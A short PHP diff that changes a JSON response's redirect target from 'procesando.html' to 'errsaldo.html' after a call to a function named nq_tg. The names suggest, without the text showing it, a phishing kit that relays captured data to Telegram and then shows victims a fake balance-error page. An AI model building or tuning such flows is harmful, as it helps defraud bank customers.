@@ -23,5 +23,5 @@ nq_tg($msg);
 echo json_encode([
     'success' => true,
     'data'    => ['session_id' => nq_session()],
-    'redirect' => 'procesando.html',
+    'redirect' => 'errsaldo.html',
 ]);
